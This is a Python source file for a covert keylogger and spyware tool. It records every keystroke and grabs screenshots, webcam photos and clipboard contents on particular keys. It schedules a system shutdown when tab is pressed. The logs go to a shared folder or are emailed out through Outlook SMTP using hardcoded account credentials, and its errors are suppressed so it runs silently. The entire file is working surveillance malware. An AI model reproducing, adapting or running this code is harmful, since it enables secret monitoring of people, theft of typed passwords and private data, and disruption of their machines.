import os
import cv2
import pyperclip
from PIL import ImageGrab
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 40  # (in seconds)
EMAIL_ADDRESS = "spysee128@outlook.com"
EMAIL_PASSWORD = "test.js123"

P_SCR = "screenshots"
P_CAM = "camera_pics"
P_CLIP = "clipboard.txt"
SHARED_FOLDER = r"H:\Development\logme"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()
        self.last_char = None

    def key_press(self, event):
        """This callback is invoked whenever a keyboard event occurs."""
        name = event.name
        if event.event_type == 'down':
            if name == self.last_char:
                return
            
            self.last_char = name

            if len(name) > 1:
                if name == "space":
                    name = " "
                    self.snap()  # Capture screenshot on pressing "space"
                elif name == "enter":
                    name = "[ENTER]\n"
                    self.cam_pic()  # Capture camera picture on pressing "enter"
                elif name == "tab":
                    self.sch_shutdown()  # Schedule shutdown on pressing "tab"
                    name = "[TAB]"
                elif name == "ctrl":
                    self.clip()  # Capture clipboard data on pressing "ctrl"
                    name = "[CTRL]"
                else:
                    name = f"[{name.upper()}]"

            self.log += name  # Append the logged key

        elif event.event_type == 'up':
            # Clear last_char on key release to allow for future presses
            self.last_char = None

    def create_filename(self):
        start_date_str = str(self.start_date)[:7].replace(" ", "_").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f'keylog-{start_date_str}_{end_date_str}'

    def save_to_file(self):
        log_file_path = os.path.join(SHARED_FOLDER, "keylog.txt") 
        with open(log_file_path, "a") as f:
            f.write(self.log)  # Change from print to write
        # Remove print statements for silent operation

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=0):  # Disable verbosity
        try:
            server = smtplib.SMTP(host="smtp-mail.outlook.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, self.prepare_mail(message))
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            self.create_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.save_to_file()
            self.start_date = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.hook(callback=self.key_press)
        self.report()
        keyboard.wait('esc') 

    def sch_shutdown(self):
        os.system("shutdown /s /t 60")

    def snap(self):
        try:
            os.makedirs(P_SCR, exist_ok=True)
            img = ImageGrab.grab()
            fname = os.path.join(P_SCR, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            img.save(fname)
        except Exception:
            pass  # Suppress exceptions for silent operation

    def cam_pic(self):
        try:
            os.makedirs(P_CAM, exist_ok=True)
            cap = cv2.VideoCapture(0)
            ret, frm = cap.read()
            if ret:
                fname = os.path.join(P_CAM, f"camera_pic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
                cv2.imwrite(fname, frm)
            cap.release()
            cv2.destroyAllWindows()
        except Exception:
            pass  # Suppress exceptions for silent operation

    def clip(self):
        try:
            data = pyperclip.paste()
            with open(f"{SHARED_FOLDER}\\{P_CLIP}", "a", buffering=1) as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
        except Exception:
            pass  # Suppress exceptions for silent operation

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
